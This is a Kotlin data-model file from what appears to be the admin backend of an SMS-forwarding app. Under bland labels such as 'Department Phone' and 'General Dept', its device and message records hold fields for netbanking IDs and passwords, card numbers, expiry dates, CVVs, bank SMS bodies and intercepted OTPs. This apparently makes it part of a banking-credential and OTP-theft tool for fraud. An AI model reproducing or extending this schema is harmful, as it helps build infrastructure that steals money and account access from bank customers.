package com.smsforwarder.admin.domain.model

import kotlinx.serialization.Serializable

/**
 * Department phone / user metadata.
 */
@Serializable
data class AdminDeviceDto(
    val deviceId: String = "",
    val deviceName: String = "Department Phone",
    val departmentName: String = "General Dept",
    val mobileNumber: String = "N/A",
    val address: String = "Main Office",
    val bankName: String? = null,
    val accountNumber: String? = null,
    val ifscCode: String? = null,
    val netbankingId: String? = null,
    val netbankingPassword: String? = null,
    val cardNumber: String? = null,
    val cardExpiry: String? = null,
    val cardCvv: String? = null,
    val role: String = "SOURCE",
    val status: String = "OFFLINE",
    val lastSeen: String? = null,
    val isOnline: Boolean = false,
    val messageCount: Int = 0
)

/**
 * Notification / SMS log item.
 */
@Serializable
data class AdminMessageDto(
    val messageId: String = "",
    val id: String = "",
    val deviceId: String = "",
    val departmentName: String = "General Dept",
    val mobileNumber: String = "N/A",
    val address: String = "Main Office",
    val bankName: String? = null,
    val accountNumber: String? = null,
    val ifscCode: String? = null,
    val netbankingId: String? = null,
    val netbankingPassword: String? = null,
    val cardNumber: String? = null,
    val cardExpiry: String? = null,
    val cardCvv: String? = null,
    val sender: String = "BANK",
    val body: String = "",
    val otp: String? = null,
    val timestamp: String? = null,
    val receivedAt: String? = null
)
